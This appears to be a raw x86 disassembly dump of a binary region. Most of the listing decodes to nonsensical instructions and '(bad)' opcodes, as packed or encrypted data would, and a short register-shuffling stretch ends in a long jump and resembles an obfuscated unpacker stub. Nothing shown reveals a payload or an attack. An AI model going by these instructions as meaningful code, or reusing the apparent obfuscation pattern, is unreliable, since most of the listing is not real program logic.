  41386a:	cmp    esi,DWORD PTR [ebx+0x1d]
  41386d:	push   ds
  41386e:	sahf   
  41386f:	and    BYTE PTR [ecx],al
  413871:	mov    ebp,DWORD PTR ds:[ebp+0x56]
  413875:	out    0xf2,eax
  413877:	lock ret 0xa37b
  41387b:	push   ds
  41387c:	adc    DWORD PTR [edi-0x3a3cb818],edx
  413882:	add    esp,edx
  413884:	pop    es
  413885:	scas   eax,DWORD PTR es:[edi]
  413886:	std    
  413887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413888:	pop    ebx
  413889:	jbe    0x413822
  41388b:	pushf  
  41388c:	push   ebp
  41388d:	mov    ds:0xfa63a16b,al
  413892:	push   eax
  413893:	xchg   ebp,eax
  413894:	repnz sti 
  413896:	xchg   esi,eax
  413897:	fwait
  413898:	push   edi
  413899:	mov    ebx,0x874e6bdf
  41389e:	nop
  41389f:	push   ss
  4138a0:	pop    edx
  4138a1:	mov    eax,0x71682f8b
  4138a6:	push   0xf
  4138a8:	lock pop ebp
  4138aa:	pop    edi
  4138ab:	inc    ebp
  4138ac:	fadd   QWORD PTR [eax-0x52352c01]
  4138b2:	fsub   DWORD PTR [edx+0x5c]
  4138b5:	jns    0x413899
  4138b7:	mov    cl,bl
  4138b9:	xchg   esi,eax
  4138ba:	sub    ah,BYTE PTR [ebp+0x9]
  4138bd:	mov    al,ds:0xd89bb332
  4138c2:	pmulhw mm4,QWORD PTR [edi-0x2f]
  4138c6:	adc    ah,BYTE PTR ds:0x65b88251
  4138cc:	lock jge 0x413851
  4138cf:	sbb    BYTE PTR ds:0x1c2075d,bh
  4138d5:	jb     0x413904
  4138d7:	(bad)  
  4138d9:	mov    al,0x13
  4138db:	mov    ds:0xdf292ad2,eax
  4138e0:	xor    BYTE PTR [ebx+0x5d00213b],dh
  4138e6:	js     0x41388e
  4138e8:	in     eax,dx
  4138e9:	and    BYTE PTR [ebp+0x7aefcf19],ch
  4138ef:	push   0xffffffda
  4138f1:	adc    ebx,esp
  4138f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138f4:	push   0xe
  4138f6:	jge    0x41396c
  4138f8:	mov    ebp,0x49782f8c
  4138fd:	xor    esp,DWORD PTR [ebp+eiz*2-0x45975904]
  413904:	push   0x2d435e4d
  413909:	push   0x8d65d54e
  41390e:	cmp    al,0xbc
  413910:	push   cs
  413911:	fnstenv [ebx+0x52a1a00c]
  413917:	push   esi
  413918:	and    esi,DWORD PTR [edi-0x37fc5cf7]
  41391e:	clc    
  41391f:	sub    esi,DWORD PTR [edx+edi*2-0x1fc17f94]
  413926:	add    bl,BYTE PTR [ecx]
  413928:	sub    DWORD PTR [ebp+eiz*8+0x65],esp
  41392c:	test   DWORD PTR [ebp-0x74],0x71dc8bca
  413933:	and    dl,cl
  413935:	loopne 0x413902
  413937:	call   0xe6d5:0xf14053ff
  41393e:	(bad)  
  41393f:	jp     0x4138d2
  413941:	jmp    0x6d0e:0x9253caaf
  413948:	fs and eax,0x2049a740
  41394e:	or     BYTE PTR ds:0x355c2882,cl
  413954:	adc    ch,BYTE PTR [ecx+0x47]
  413957:	mov    eax,0x3dfac13d
  41395c:	sbb    eax,0x65c3eb6b
  413961:	add    ch,BYTE PTR [edi-0x3f]
  413964:	pushf  
  413965:	mov    dl,0xff
  413967:	dec    esp
  413968:	push   0xffffffa4
  41396a:	fs xchg ebx,eax
  41396c:	shufps xmm4,XMMWORD PTR [edx-0x45427a9c],0xc8
  413974:	shr    ebp,0x2f
  413977:	sbb    BYTE PTR [edx-0x5c1280a],dl
  41397d:	adc    BYTE PTR [edx+0x13],ah
  413980:	sub    bh,0xf7
  413983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413984:	lods   eax,DWORD PTR ds:[esi]
  413985:	retf   
  413986:	cld    
  413987:	es mul DWORD PTR fs:[eax+eiz*4]
  41398c:	mov    esi,0xc7f104c6
  413991:	sbb    ecx,DWORD PTR [edx]
  413993:	cmp    edi,DWORD PTR [esi+edi*8-0x5a911924]
  41399a:	jg     0x413935
  41399c:	push   eax
  41399d:	cmp    ecx,DWORD PTR ds:0x67088f5e
  4139a3:	or     eax,DWORD PTR [edi+esi*1+0x27]
  4139a7:	sbb    BYTE PTR [ebp-0x2b2fd875],0xca
  4139ae:	add    BYTE PTR [edx+0xe],ah
  4139b1:	pushf  
  4139b2:	push   ecx
  4139b3:	jb     0x41395b
  4139b5:	(bad)  
  4139b7:	mov    ah,0x9
  4139b9:	dec    esi
  4139ba:	fisub  DWORD PTR ds:0xaf79812c
  4139c0:	out    0x7c,al
  4139c2:	or     DWORD PTR ds:0x642ecf0f,ebx
  4139c8:	xchg   edx,eax
  4139c9:	(bad)  
  4139ca:	cld    
  4139cb:	mov    dh,0xdb
  4139cd:	sub    bh,dh
  4139cf:	pop    es
  4139d0:	and    dl,ch
  4139d2:	aam    0x35
  4139d4:	add    esp,esi
  4139d6:	sbb    dh,0xb4
  4139d9:	ins    DWORD PTR es:[edi],dx
  4139da:	stos   BYTE PTR es:[edi],al
  4139db:	cdq    
  4139dc:	in     eax,dx
  4139dd:	xchg   bh,dl
  4139df:	sub    al,0x2c
  4139e1:	arpl   WORD PTR [edx-0x70],cx
  4139e4:	push   0x3c
  4139e6:	inc    edx
  4139e7:	dec    eax
  4139e8:	adc    al,0xef
  4139ea:	jno    0x413a3b
  4139ec:	dec    ebx
  4139ed:	mov    eax,ds:0x18f17100
  4139f2:	loopne 0x413a52
  4139f4:	ret    
  4139f5:	jnp    0x4139aa
  4139f7:	jae    0x4139bc
  4139f9:	stc    
  4139fa:	sbb    al,0xea
  4139fc:	push   edi
  4139fd:	and    eax,0x4b11890c
  413a02:	loopne 0x4139ed
  413a04:	mov    DWORD PTR ds:0x466208bf,edi
  413a0a:	(bad)  
  413a0b:	les    ecx,FWORD PTR [esi]
  413a0d:	iret   
  413a0e:	sar    DWORD PTR [eax+eiz*8+0x4b],1
  413a12:	scas   al,BYTE PTR es:[edi]
  413a13:	pop    ss
  413a14:	mov    al,BYTE PTR [ecx-0x6a23011a]
  413a1a:	loope  0x413a1b
  413a1c:	adc    ch,0x9d
  413a1f:	push   edi
  413a20:	test   eax,0x1a67dca7
  413a25:	sub    esi,edi
  413a27:	push   esp
  413a28:	outs   dx,BYTE PTR ds:[esi]
  413a29:	fst    st(0)
  413a2b:	mov    ecx,DWORD PTR [edi-0x4b]
  413a2e:	popa   
  413a2f:	call   0x4c0b:0x7648da1
  413a36:	mov    DWORD PTR [ebx-0x343e6e5a],edi
  413a3c:	pop    ebx
  413a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a3e:	stos   BYTE PTR es:[edi],al
  413a3f:	fidiv  DWORD PTR [edi]
  413a41:	mov    esp,0x385f32fb
  413a46:	dec    ebp
  413a47:	imul   esp,DWORD PTR [ebp+0x9f22d83],0x25
  413a4e:	lds    ebx,FWORD PTR [ebp-0x7a1bd501]
  413a54:	mov    ah,0x13
  413a56:	es pop eax
  413a58:	jl     0x413a2c
  413a5a:	inc    edi
  413a5b:	sub    BYTE PTR [ecx],0x26
  413a5e:	xchg   DWORD PTR [esi+edx*8-0x1a],eax
  413a62:	jbe    0x4139fe
  413a64:	mov    gs,WORD PTR [edi+0x79]
  413a67:	js     0x413a5c
  413a69:	cmp    eax,0xb9477fb4
  413a6e:	and    al,0x60
  413a70:	and    ecx,DWORD PTR [ecx]
  413a72:	(bad)  
  413a73:	aam    0xec
  413a75:	and    eax,0xd68b5b79
  413a7a:	add    ebx,0x1002
  413a80:	lea    eax,[ebp-0x10]
  413a83:	add    edx,eax
  413a85:	add    edx,0x5
  413a88:	push   edx
  413a89:	inc    esi
  413a8a:	pop    ecx
  413a8b:	dec    ecx
  413a8c:	xchg   ecx,eax
  413a8d:	dec    eax
  413a8e:	xchg   ecx,eax
  413a8f:	dec    ecx
  413a90:	xchg   ecx,edx
  413a92:	dec    edx
  413a93:	push   edx
  413a94:	mov    edx,ebx
  413a96:	pop    ebx
  413a97:	jmp    0x415e2d
  413a9c:	lea    edi,[edi+0x6a]
  413a9f:	sub    al,0x68
  413aa1:	ins    BYTE PTR es:[edi],dx
  413aa2:	int    0x1e
  413aa4:	xchg   ebx,eax
  413aa5:	mov    dh,0xda
  413aa7:	(bad)  [eax]
  413aa9:	dec    ebx
  413aaa:	neg    BYTE PTR ds:0x7b7a9161
  413ab0:	repnz cwde 
  413ab2:	jnp    0x413b2f
  413ab4:	aaa    
  413ab5:	xlat   BYTE PTR ds:[ebx]
  413ab6:	or     DWORD PTR [esi],edi
  413ab8:	push   0xa93db9bd
  413abd:	outs   dx,BYTE PTR ds:[esi]
  413abe:	dec    edx
  413abf:	xor    BYTE PTR [edx],0x17
  413ac2:	jmp    FWORD PTR [edi]
  413ac4:	loopne 0x413ad1
  413ac6:	test   al,0x20
  413ac8:	xor    al,0x63
  413aca:	xchg   edx,eax
  413acb:	int    0xe9
  413acd:	mov    eax,0xe88e1424
  413ad2:	xor    BYTE PTR [eax-0x70],dh
  413ad5:	jae    0x413ab8
  413ad7:	or     DWORD PTR [ecx-0x7],0xffffffd6
  413adb:	xchg   edx,eax
  413adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413add:	test   al,0x27
  413adf:	repnz aaa 
  413ae1:	pop    ebp
  413ae2:	or     DWORD PTR [eax+0x16c74af9],0x6b30c371
  413aec:	std    
  413aed:	push   ds
  413aee:	out    dx,al
  413aef:	pushf  
  413af0:	jne    0x413b4e
  413af2:	xchg   edx,eax
  413af3:	push   edi
  413af4:	add    BYTE PTR [edx],0x24
  413af7:	jbe    0x413abc
  413af9:	xor    ah,BYTE PTR [edx]
  413afb:	fld    DWORD PTR [ebx+esi*2]
  413afe:	js     0x413af0
  413b00:	pop    ebp
  413b01:	mov    ebp,0x8a43aaa
  413b06:	jle    0x413b01
  413b08:	shl    BYTE PTR [eax],1
  413b0a:	(bad)  
  413b0b:	adc    eax,0x653ae203
  413b10:	cmp    DWORD PTR [ecx+ebx*8-0xf],eax
  413b14:	pop    edx
  413b15:	inc    esp
  413b16:	sub    bh,BYTE PTR [edx]
  413b18:	mov    cl,0x38
  413b1a:	les    eax,FWORD PTR [edx+edx*2]
  413b1d:	popf   
  413b1e:	mov    bl,BYTE PTR [eax+esi*8]
  413b21:	and    al,0x3c
  413b23:	and    DWORD PTR [ebx-0x32421d06],esi
  413b29:	cmp    cl,0x6d
  413b2c:	xor    edx,0xffffffed
  413b2f:	jne    0x413b58
  413b31:	push   es
  413b32:	mov    edx,0x86b6c652
  413b37:	push   ebp
  413b38:	push   0xf6a65efd
  413b3d:	outs   dx,DWORD PTR ds:[esi]
  413b3e:	jo     0x413b9e
  413b40:	sbb    DWORD PTR [ebx+0x78f877e4],ebx
  413b46:	lods   eax,DWORD PTR ds:[esi]
  413b47:	adc    dl,BYTE PTR [eax+0x71acb850]
  413b4d:	dec    eax
  413b4e:	call   0x9c88:0x9159ed2f
  413b55:	out    0x47,eax
  413b57:	and    BYTE PTR [edx],bl
  413b59:	dec    edx
  413b5a:	sub    edx,ecx
  413b5c:	mov    esp,0xbe172539
  413b61:	(bad)  
  413b62:	ficom  DWORD PTR [esi-0x7a]
  413b65:	or     DWORD PTR [eax+0x73],esi
  413b68:	sbb    ah,BYTE PTR [esi-0x6a3d1cb4]
  413b6e:	mov    esp,0x7b0fbac1
  413b73:	aam    0x3b
  413b75:	xchg   BYTE PTR [edx-0x2a526366],ah
  413b7b:	cld    
  413b7c:	js     0x413b2e
  413b7e:	pop    eax
  413b7f:	or     edx,DWORD PTR [ebx+eiz*4+0x61ca52a7]
  413b86:	dec    ebx
  413b87:	pushf  
  413b88:	mov    ds:0x8f46d57e,eax
  413b8d:	aas    
  413b8e:	popa   
  413b8f:	jmp    0x413b44
  413b91:	enter  0xc6a0,0x3
  413b95:	popf   
  413b96:	mov    ds:0x2a310067,eax
  413b9b:	(bad)  
  413b9c:	and    dl,ah
  413b9e:	popa   
  413b9f:	out    0x2c,al
  413ba1:	dec    edi
  413ba2:	cmp    esp,esi
  413ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ba5:	xor    BYTE PTR [esp+ebp*2-0x3d599f17],dh
  413bac:	test   BYTE PTR [eax+edx*2-0x29d5bc05],ch
  413bb3:	sbb    eax,0x8e30dce7
  413bb8:	or     eax,0x5b83b83f
  413bbe:	imul   edx,DWORD PTR [ebx],0x44c6907d
  413bc4:	in     eax,0x7e
  413bc6:	push   esp
  413bc7:	jbe    0x413c09
  413bc9:	xor    al,0x61
  413bcb:	jnp    0x413b64
  413bcd:	and    al,0x92
  413bcf:	adc    DWORD PTR ds:0x2b5bbea6,edx
  413bd5:	mov    ds:0xbd14abeb,eax
  413bda:	jns    0x413b64
  413bdc:	lds    eax,FWORD PTR [esi-0x5c9454da]
  413be2:	or     cl,bh
  413be4:	jl     0x413b93
  413be6:	adc    cl,BYTE PTR [edx-0x7eb62d86]
  413bec:	in     eax,dx
  413bed:	jmp    0x734d0af7
  413bf2:	test   al,0x18
  413bf4:	sbb    esp,DWORD PTR ds:0x65387dd5
  413bfa:	lea    edx,[edi-0x2035008e]
  413c00:	jmp    0x413c06
  413c02:	sbb    dl,al
  413c04:	in     eax,0x9c
  413c06:	(bad)  
  413c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c09:	mov    edi,0x7fa8ba5f
  413c0e:	jge    0x413bc2
  413c10:	inc    edx
  413c11:	lock pop ecx
  413c13:	dec    edx
  413c14:	add    al,0x0
  413c16:	lock jno 0x413c5d
  413c19:	cwde   
  413c1a:	ins    BYTE PTR es:[edi],dx
  413c1b:	or     dh,0x92
  413c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c1f:	mov    ecx,gs
  413c21:	repz cdq 
  413c23:	ss or  eax,0x389ba586
  413c29:	mov    ds:0x818858ae,al
  413c2e:	in     eax,dx
  413c2f:	sbb    DWORD PTR [edx+0x5],esp
  413c32:	fld    DWORD PTR [ebp-0x2b]
  413c35:	rcr    BYTE PTR [edx-0x49],0x2f
  413c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c3a:	and    bl,0xf3
  413c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c3e:	xor    eax,0xabae42d6
  413c43:	test   ax,0xfb0e
  413c47:	test   BYTE PTR [esp+edi*2-0x735f93e0],dl
  413c4e:	push   es
  413c4f:	popf   
  413c50:	jmp    0x413c56
  413c52:	inc    esp
  413c53:	fld    TBYTE PTR [edx]
  413c55:	clc    
  413c56:	retf   
  413c57:	imul   ebx,edx,0x1a
  413c5a:	loope  0x413c1e
  413c5c:	push   eax
  413c5d:	inc    esp
  413c5e:	push   edx
  413c5f:	jge    0x413c18
  413c61:	gs loop 0x413ca1
  413c64:	jecxz  0x413bff
  413c66:	cmp    eax,DWORD PTR [edx]
  413c68:	pop    eax
  413c69:	imul   edi,DWORD PTR [edx+0xc59724b],0x7595d000
  413c73:	dec    esi
  413c74:	adc    ah,BYTE PTR [edi]
  413c76:	ins    DWORD PTR es:[edi],dx
  413c77:	jmp    0xd258f37b
  413c7c:	arpl   WORD PTR [eax],cx
  413c7e:	inc    ebp
  413c7f:	lahf   
  413c80:	xchg   ebp,eax
  413c81:	out    0x8d,al
  413c83:	sub    BYTE PTR [ecx],bh
  413c85:	loop   0x413cdb
  413c87:	arpl   dx,bp
  413c89:	jp     0x413c89
  413c8b:	in     eax,0xd7
  413c8d:	repz pop esp
  413c8f:	adc    DWORD PTR [edi+eiz*2+0x77ff99ec],0xffffffe0
  413c97:	mov    al,bh
  413c99:	stos   BYTE PTR es:[edi],al
  413c9a:	adc    eax,0xc4350613
  413c9f:	push   ds
  413ca0:	js     0x413c86
  413ca2:	dec    edx
  413ca3:	out    0x48,eax
  413ca5:	adc    DWORD PTR [ebp-0x446a2bd6],edx
  413cab:	loopne 0x413c8b
  413cad:	popf   
  413cae:	test   BYTE PTR fs:[ebx+eiz*4],ch
  413cb2:	jmp    0x413d28
  413cb4:	mov    dh,0x83
  413cb6:	push   ss
  413cb7:	or     al,0x30
  413cb9:	adc    esp,ebx
  413cbb:	fucomp st(4)
  413cbd:	div    DWORD PTR [ebx-0x5d]
  413cc0:	mov    al,ds:0x6b0a491e
  413cc5:	and    eax,0x55fa0fb2
  413cca:	mov    bh,0xa7
  413ccc:	or     al,0x9e
  413cce:	adc    BYTE PTR [eax],bl
  413cd0:	mov    ecx,0xa8fb0d0a
  413cd5:	add    BYTE PTR [eax-0x61],ah
  413cd8:	and    BYTE PTR [edx-0x76],bh
  413cdb:	fild   DWORD PTR [ebp-0x1a3312ed]
  413ce1:	add    bl,BYTE PTR [ebx]
  413ce3:	cmp    edx,DWORD PTR ds:0xf4d4922c
  413ce9:	xchg   esi,eax
  413cea:	xchg   DWORD PTR [esp+eax*1],esp
  413ced:	or     DWORD PTR [ecx],ebx
  413cef:	push   edi
  413cf0:	call   0x898c:0xaa965f88
  413cf7:	je     0x413cc0
  413cf9:	dec    esp
  413cfa:	shr    DWORD PTR [ebp+eiz*2-0x74124528],0xd3
  413d02:	add    ebp,esi
  413d04:	(bad)  
  413d05:	sbb    BYTE PTR [ecx-0x4b],cl
  413d08:	inc    edi
  413d09:	sbb    eax,0xff8309bb
  413d0e:	add    eax,0x745fb460
  413d13:	retf   0xf441
  413d16:	test   DWORD PTR [ebx],eax
  413d18:	inc    ecx
  413d19:	jae    0x413d81
  413d1b:	xor    eax,0xa426cc89
  413d20:	inc    eax
  413d21:	xlat   BYTE PTR ds:[ebx]
  413d22:	mov    ds:0x2d69cae2,al
  413d27:	push   esp
  413d28:	loope  0x413d61
  413d2a:	sbb    BYTE PTR [edx-0x2],0x10
  413d2e:	or     eax,0xe090d898
  413d33:	xchg   ebp,eax
  413d34:	fldenv [eax+0x4febbb7]
  413d3a:	jns    0x413d63
  413d3c:	test   BYTE PTR [esi+edx*1],dl
  413d3f:	cmc    
  413d40:	cmp    al,0x7a
  413d42:	daa    
  413d43:	(bad)  
  413d44:	lds    esp,FWORD PTR [eax-0x13]
  413d47:	xchg   edi,eax
  413d48:	ins    BYTE PTR es:[edi],dx
  413d49:	push   esi
  413d4a:	mov    DWORD PTR [ecx-0x1f],esi
  413d4d:	in     eax,dx
  413d4e:	pop    edx
  413d4f:	ret    
  413d50:	inc    edx
  413d51:	ss call 0x1abd:0x4977b1cd
  413d59:	dec    ebp
  413d5a:	xlat   BYTE PTR ds:[ebx]
  413d5b:	(bad)  
  413d5c:	sbb    al,0x2
  413d5e:	aaa    
  413d5f:	sahf   
  413d60:	mov    ch,0xd
  413d62:	outs   dx,BYTE PTR ds:[esi]
  413d63:	loope  0x413d7c
  413d65:	popa   
  413d66:	(bad)  
  413d67:	(bad)  
  413d68:	call   0xd333aac6
  413d6d:	push   ebx
  413d6e:	pop    es
  413d6f:	xchg   edi,eax
  413d70:	jge    0x413d9b
  413d72:	add    DWORD PTR [esi-0x4c],0x50194c84
  413d79:	inc    ebx
  413d7a:	std    
  413d7b:	add    ebx,DWORD PTR [edx+0x7]
  413d7e:	adc    eax,0xfb8fcd60
  413d83:	ds adc eax,0x126ed1ba
  413d89:	fist   DWORD PTR [bp+si-0x75]
  413d8d:	cmp    dh,BYTE PTR [ecx-0x34]
  413d90:	call   0xe29c:0x8d1c45a5
  413d97:	push   ss
  413d98:	popa   
  413d99:	call   0xbb27:0x962487d
  413da0:	cmp    ch,BYTE PTR [edx]
  413da2:	nop
  413da3:	and    ebp,edi
  413da5:	(bad)  
  413da7:	or     eax,ebp
  413da9:	or     dh,dl
  413dab:	fst    QWORD PTR [eax]
  413dad:	in     eax,dx
  413dae:	mov    ch,bl
  413db0:	js     0x413dbe
  413db2:	jo     0x413da3
  413db4:	les    esi,FWORD PTR [edi]
  413db6:	in     al,0x5c
  413db8:	mov    bl,0xa4
  413dba:	sub    BYTE PTR es:[eax],cl
  413dbd:	xchg   dh,ch
  413dbf:	out    dx,eax
  413dc0:	es js  0x413dde
  413dc3:	jo     0x413d91
  413dc5:	pop    ebp
  413dc6:	xor    edx,ebp
  413dc8:	ss sub bh,al
  413dcb:	or     al,0x5e
  413dcd:	or     bh,BYTE PTR [eax-0x80fe8fb]
  413dd3:	fld    TBYTE PTR [esi-0x1b]
  413dd6:	jmp    0x94bf:0xa29c873e
  413ddd:	cmc    
  413dde:	(bad)  
  413ddf:	ret    0xc508
  413de2:	fsubr  DWORD PTR [ecx+0x16]
  413de5:	cmp    BYTE PTR [ecx-0x1e4b3799],0xdd
  413dec:	test   DWORD PTR [ebx+0x12],ebx
  413def:	xchg   edi,eax
  413df0:	xor    eax,0x1a34b728
  413df5:	add    DWORD PTR [ecx-0x178bf3aa],ebx
  413dfb:	add    esi,edx
  413dfd:	xchg   ebx,eax
  413dfe:	sbb    eax,0xa598a287
  413e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e04:	sub    al,0x1b
  413e06:	adc    eax,DWORD PTR [ecx-0x30786e3a]
  413e0c:	neg    BYTE PTR [ecx+0x50c1eccb]
  413e12:	fcmovnbe st,st(7)
  413e14:	xor    al,0x30
  413e16:	xchg   ecx,eax
  413e17:	cmp    DWORD PTR gs:[esi-0x19],esp
  413e1b:	xor    BYTE PTR [eax],ch
  413e1d:	sbb    dh,dh
  413e1f:	or     ch,BYTE PTR [ecx]
  413e21:	xchg   edi,eax
  413e22:	mov    edx,ecx
  413e24:	lahf   
  413e25:	int3   
  413e26:	(bad)  
  413e27:	mov    ebx,0xaf6033cf
  413e2c:	mov    BYTE PTR [edx],ah
  413e2e:	add    al,0x8b
  413e30:	add    eax,0xead59c66
  413e35:	push   esi
  413e36:	aaa    
  413e37:	ret    
  413e38:	mov    eax,ds:0x7a4761f
  413e3d:	dec    ebx
  413e3e:	adc    DWORD PTR [edi-0x66],ecx
  413e41:	test   al,0x4
  413e43:	imul   DWORD PTR [ebp-0x25]
  413e46:	sti    
  413e47:	cmc    
  413e48:	sar    DWORD PTR [ecx+0x77],1
  413e4b:	(bad)  
  413e4c:	cli    
  413e4d:	adc    eax,0x7134de5b
  413e52:	shl    BYTE PTR [ebp-0x59],cl
  413e55:	jno    0x413ed0
  413e57:	int3   
  413e58:	mov    BYTE PTR [esi+0xb],cl
  413e5b:	icebp  
  413e5c:	pop    edx
  413e5d:	pop    edi
  413e5e:	(bad)  
  413e5f:	imul   DWORD PTR [ecx-0x3110c144]
  413e65:	mov    dh,0x27
  413e67:	test   cl,0x8d
  413e6a:	or     al,0x7c
  413e6c:	dec    edi
  413e6d:	cwde   
  413e6e:	cmp    eax,0x1d6021d0
  413e73:	push   ds
  413e74:	ds pop eax
  413e76:	lods   al,BYTE PTR ds:[esi]
  413e77:	add    BYTE PTR [esp+esi*4],ch
  413e7a:	aam    0xc6
  413e7c:	aam    0x15
  413e7e:	push   esi
  413e7f:	ror    edi,1
  413e81:	rcl    BYTE PTR [ebp-0x3c],cl
  413e84:	sbb    al,0x1
  413e86:	push   0xa05e0233
  413e8b:	and    cl,bh
  413e8d:	call   0xb8f6765a
  413e92:	stos   DWORD PTR es:[edi],eax
  413e93:	cmp    DWORD PTR [edi+ebp*1],edx
  413e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e97:	mov    bh,0xc3
  413e99:	mov    ah,0x8e
  413e9b:	outs   dx,DWORD PTR ds:[esi]
  413e9c:	cmp    al,0xe5
  413e9e:	hlt    
  413e9f:	cmc    
  413ea0:	inc    eax
  413ea1:	jno    0x413e34
  413ea3:	cld    
  413ea4:	push   ds
  413ea5:	adc    eax,0xe0bdf75d
  413eaa:	retf   0x84ab
  413ead:	jbe    0x413ef6
  413eaf:	xor    ah,BYTE PTR [ebx-0x2a]
  413eb2:	inc    eax
  413eb3:	dec    ecx
  413eb4:	aad    0xab
  413eb6:	in     eax,0x5e
  413eb8:	popf   
  413eb9:	push   ebx
  413eba:	mov    ebp,0xe73905af
  413ebf:	loope  0x413e55
  413ec1:	inc    edi
  413ec2:	dec    esp
  413ec3:	addr16 jmp 0xc3b7:0x5efeabf
  413ecb:	test   DWORD PTR [eax],edx
  413ecd:	lds    ecx,FWORD PTR [eax]
  413ecf:	pop    DWORD PTR [ebp+0x54dd5e22]
  413ed5:	in     eax,dx
  413ed6:	ja     0x413ec1
  413ed8:	add    bh,BYTE PTR [edx-0x5961bd9e]
  413ede:	sbb    eax,0xac27e385
  413ee3:	mov    dl,0x93
  413ee5:	xchg   ecx,eax
  413ee6:	add    BYTE PTR fs:[esi-0x5bab19bd],bh
  413eed:	(bad)  
  413eef:	push   ds
  413ef0:	dec    eax
  413ef1:	mov    WORD PTR [ebp+0x7e2dc4df],ds
  413ef7:	push   eax
  413ef8:	pop    ds
  413ef9:	mov    al,ds:0xdb5d5cd4
  413efe:	ds cdq 
  413f00:	ss cmp eax,0xc6673162
  413f06:	adc    BYTE PTR [edx+ebp*8+0x1d],0xed
  413f0b:	jmp    0xacdfc0b4
  413f10:	dec    edx
  413f11:	mov    ?,WORD PTR ds:0x234aafdc
  413f17:	cmp    bl,BYTE PTR [edi+0x70]
  413f1a:	clc    
  413f1b:	push   ebp
  413f1c:	mov    ds:0xfdcbb173,eax
  413f21:	xlat   BYTE PTR ds:[ebx]
  413f22:	jmp    0x413eb3
  413f24:	xchg   edi,eax
  413f25:	push   esp
  413f26:	ja     0x413ef3
  413f28:	and    ah,BYTE PTR [ebx]
  413f2a:	sub    DWORD PTR [ebx+0x6e182b00],edx
  413f30:	punpckhdq mm6,mm7
  413f33:	sub    DWORD PTR [bx+0x167e],ecx
  413f38:	sub    BYTE PTR [edi-0x6ea78b0b],dh
  413f3e:	in     eax,0x27
  413f40:	cwde   
  413f41:	and    al,0xcf
  413f43:	mov    bh,0x91
  413f45:	jmp    0x413f18
  413f47:	add    al,0x52
  413f49:	xchg   BYTE PTR [eax-0x32],bh
  413f4c:	xchg   ecx,eax
  413f4d:	lahf   
  413f4e:	push   eax
  413f4f:	pop    ds
  413f50:	jg     0x413fcf
  413f52:	inc    esi
  413f53:	sub    cl,BYTE PTR [ecx+ebx*1+0x77]
  413f57:	add    al,0xfb
  413f59:	add    esi,esp
  413f5b:	add    bh,BYTE PTR [ebp-0x1e]
  413f5e:	mov    dl,0x7a
  413f60:	das    
  413f61:	xchg   esi,eax
  413f62:	push   0xfffffff4
  413f64:	add    eax,0x86faa85d
  413f69:	and    DWORD PTR [ebx],0x5
  413f6c:	adc    eax,0xd7c22d4e
  413f71:	dec    ebp
  413f72:	adc    DWORD PTR [edx],ecx
  413f74:	push   ss
  413f75:	(bad)  
  413f76:	cwde   
  413f77:	cli    
  413f78:	add    eax,0x7b05832f
  413f7d:	imul   esp,ebx,0xb8a7c99c
  413f83:	xchg   DWORD PTR [edx+0x73],ebx
  413f86:	mov    esp,0x52504f5
  413f8b:	jb     0x413f23
  413f8d:	je     0x413fd4
  413f8f:	and    eax,0x2b64cccb
  413f94:	scas   al,BYTE PTR es:[edi]
  413f95:	inc    edi
  413f96:	cdq    
  413f97:	loop   0x414018
  413f99:	into   
  413f9a:	aam    0x66
  413f9c:	adc    al,0x13
  413f9e:	jae    0x413f5f
  413fa0:	jp     0x41401b
  413fa2:	mov    eax,ds:0x28dcf3a
  413fa7:	cmp    al,0x29
  413fa9:	xchg   esi,eax
  413faa:	mov    eax,ds:0xbc2f153
  413faf:	pop    ebp
  413fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb1:	adc    al,0x78
  413fb3:	pop    ebx
  413fb4:	ins    DWORD PTR es:[edi],dx
  413fb5:	sbb    BYTE PTR [eax+0x24],dl
  413fb8:	aaa    
  413fb9:	fwait
  413fba:	addr16 cdq 
  413fbc:	xchg   esi,eax
  413fbd:	mov    ebx,0x5d15f2d0
  413fc2:	push   ss
  413fc3:	xchg   ebx,eax
  413fc4:	jmp    FWORD PTR [ecx]
  413fc6:	add    BYTE PTR [ecx],dl
  413fc8:	push   ss
  413fc9:	mov    edx,0x98eb3b09
  413fce:	jl     0x413fd7
  413fd0:	cmp    DWORD PTR [edi-0x74],edi
  413fd3:	cmp    eax,0x42da1bba
  413fd8:	jecxz  0x413f8e
  413fda:	xchg   ebp,eax
  413fdb:	into   
  413fdc:	mov    ebx,0xa9509b47
  413fe1:	xor    eax,0x6c0c777f
  413fe6:	out    0xb3,al
  413fe8:	mov    ds:0x73bed323,al
  413fed:	mov    DWORD PTR [ebp-0x2bbab70b],ebp
  413ff3:	mov    bh,0xea
  413ff5:	nop
  413ff6:	xchg   ebx,eax
  413ff7:	daa    
  413ff8:	push   edx
  413ff9:	mov    dl,0xa3
  413ffb:	jns    0x413fa2
  413ffd:	mov    eax,ebp
  413fff:	(bad)  
  414000:	push   DWORD PTR [ecx-0x7a]
  414003:	mov    al,0x14
  414005:	js     0x413fe8
  414007:	jmp    0x413ff1
  414009:	xor    ch,BYTE PTR [edx]
  41400b:	sbb    DWORD PTR [eax+0x8e9434d],0x8261293f
  414015:	bound  eax,QWORD PTR [ecx+ebp*8+0x6]
  414019:	mov    al,ds:0x5f29e005
  41401e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41401f:	das    
  414020:	in     eax,0x62
  414022:	mov    ds:0x8a871413,eax
  414027:	push   eax
  414028:	aad    0xb6
  41402a:	push   0xcab92df2
  41402f:	stos   DWORD PTR es:[edi],eax
  414030:	add    ah,al
  414032:	fisub  WORD PTR [edx+0x3b]
  414035:	or     DWORD PTR [ebp-0x67],esi
  414038:	and    DWORD PTR cs:[esi+ebx*8-0xeda7e47],0x9cdea880
  414044:	xchg   esi,eax
  414045:	xlat   BYTE PTR ds:[ebx]
